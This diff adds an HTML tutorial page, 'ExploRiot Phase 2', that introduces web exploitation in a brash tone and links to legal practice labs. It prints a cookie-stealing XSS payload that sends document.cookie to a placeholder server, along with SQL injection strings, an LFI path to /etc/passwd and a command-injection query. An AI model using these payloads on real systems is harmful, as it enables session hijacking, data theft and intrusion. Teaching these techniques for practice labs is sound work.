@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ExploRiot - Phase 2: Exploitation Techniques</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="phase-title-container">
+            <h1 class="phase-number">PHASE 2</h1>
+            <h1 class="phase-name">EXPLOITATION TECHNIQUES</h1>
+        </div>
+
+        <div class="objective-box">
+            <p>Find a hole, rip it open, inject your will. We're talking real-world web app exploitation, the most common gateway to shell access.</p>
+        </div>
+
+        <h2>💣 1. Web Exploits – Your Daily Driver</h2>
+        <p>These are the money-makers. Understand them, abuse them, automate them.</p>
+
+        <h3>🔹 XSS – Cross-Site Scripting</h3>
+        <p>Inject JavaScript into a web page so it runs in someone else’s browser. Used for stealing cookies, redirecting users, or hijacking sessions.</p>
+        <p>Example Payload:</p>
+        <pre><code>&lt;script&gt;fetch('http://yourserver.com/steal?c=' + document.cookie)&lt;/script&gt;</code></pre>
+        <p>Practice here:</p>
+        <ul>
+            <li><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener noreferrer">XSS Game</a></li>
+            <li><a href="https://tryhackme.com/room/xss" target="_blank" rel="noopener noreferrer">TryHackMe: XSS</a></li>
+        </ul>
+
+        <h3>🔹 SQL Injection – Talk to the Database Like a Psycho</h3>
+        <p>Break login forms, dump user creds, or gain admin access by injecting SQL commands.</p>
+        <p>Classic Payload:</p>
+        <pre><code>' OR 1=1 --</code></pre>
+        <p>Target Example:</p>
+        <pre><code>GET /product?id=1' OR '1'='1</code></pre>
+        <p>Tools:</p>
+        <ul>
+            <li><a href="http://sqlmap.org/" target="_blank" rel="noopener noreferrer">sqlmap</a> — You feed it a URL, it dumps the DB like a baby with diarrhea.</li>
+        </ul>
+        <p>Practice here:</p>
+        <ul>
+            <li><a href="https://dvwa.co.uk/" target="_blank" rel="noopener noreferrer">DVWA</a> (Damn Vulnerable Web Application)</li>
+            <li><a href="http://www.itsecgames.com/" target="_blank" rel="noopener noreferrer">bWAPP</a> (buggy Web Application)</li>
+        </ul>
+
+        <h3>🔹 LFI – Local File Inclusion</h3>
+        <p>Trick the server into loading files it shouldn’t. Read <code>/etc/passwd</code>, source code, or config files.</p>
+        <p>Example URL:</p>
+        <pre><code>http://victim.com/page.php?file=../../../../etc/passwd</code></pre>
+        <p>Goal: Chain it with log poisoning or RCE.</p>
+
+        <h3>🔹 RCE – Remote Code Execution</h3>
+        <p>The god-tier vuln. Run commands on the server from the outside.</p>
+        <p>If you get this:</p>
+        <pre><code>page.php?cmd=whoami</code></pre>
+        <p>You’re already in. It’s just a matter of escalation now.</p>
+
+        <h2>🛠️ 2. Tools to Automate Your Carnage</h2>
+        <ul>
+            <li><a href="https://portswigger.net/burp" target="_blank" rel="noopener noreferrer">Burp Suite</a>: Intercept requests, edit payloads, scan vulnerabilities.</li>
+            <li><a href="http://sqlmap.org/" target="_blank" rel="noopener noreferrer">sqlmap</a>: SQLi made stupid-easy.</li>
+            <li><a href="https://cirt.net/Nikto2" target="_blank" rel="noopener noreferrer">Nikto</a>: Find common server misconfigs.</li>
+            <li><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener noreferrer">wfuzz</a> / <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">ffuf</a>: Bruteforce parameters, dirs, files.</li>
+        </ul>
+
+        <h2>📚 3. Where to Learn This by Breaking Shit</h2>
+        <ul>
+            <li><a href="https://tryhackme.com/module/owasp-top-10" target="_blank" rel="noopener noreferrer">TryHackMe: OWASP Top 10</a></li>
+            <li><a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">PortSwigger Web Security Academy</a> — free, comprehensive, practical</li>
+        </ul>
+        <p>Every broken site, every exposed database, every hijacked session — it starts with this phase.</p>
+
+        <div class="back-button-container">
+            <a href="index.html" class="back-button">Back to Index</a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        ExploRiot &copy; 2025
+    </footer>
+</body>
+</html>
